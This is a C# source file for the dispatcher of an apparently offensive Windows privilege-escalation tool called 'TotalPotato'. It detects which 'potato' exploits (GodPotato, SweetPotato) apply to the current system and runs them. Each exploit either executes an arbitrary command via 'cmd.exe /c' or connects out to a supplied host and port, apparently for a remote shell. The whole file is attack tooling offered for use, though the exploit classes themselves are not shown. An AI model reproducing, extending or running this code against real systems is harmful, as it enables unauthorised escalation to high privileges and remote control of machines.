namespace TotalPotato
{
    public class Handler
    {
        private List<IPotatoes> potatoes;
        public Handler()
        {
            potatoes = new List<IPotatoes>
                {
                    new GodPotato(),
                    new SweetPotato()
                };
        }

        public void Run(string? cmd, string? host = null, string? port = null)
        {
            Console.WriteLine("[*] Detecting suitable exploits for current system...");
            bool state = false;
            foreach (var exploit in potatoes)
            {
                if (exploit.IsApplicable())
                {
                    Console.WriteLine($"[+] Applicable: {exploit.Name} - {exploit.Description}");
                    if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(port))
                    {
                        state = exploit.Execute("cmd.exe /c " + cmd, null, 0);
                    }
                    else
                    {
                        state = exploit.Execute(null, host, int.Parse(port));
                    }

                    Console.WriteLine("[+] Response indicates success, would you still like to try another method? (y/n)");
                    var input = Console.ReadKey();
                    if (input.Key != ConsoleKey.Y)
                    {
                        return;
                    }
                }
                else
                {
                    Console.WriteLine($"[-] Skipping: {exploit.Name} (not compatible)");
                }
            }

            Console.WriteLine("[!] No applicable exploits found.");
        }
    }

}
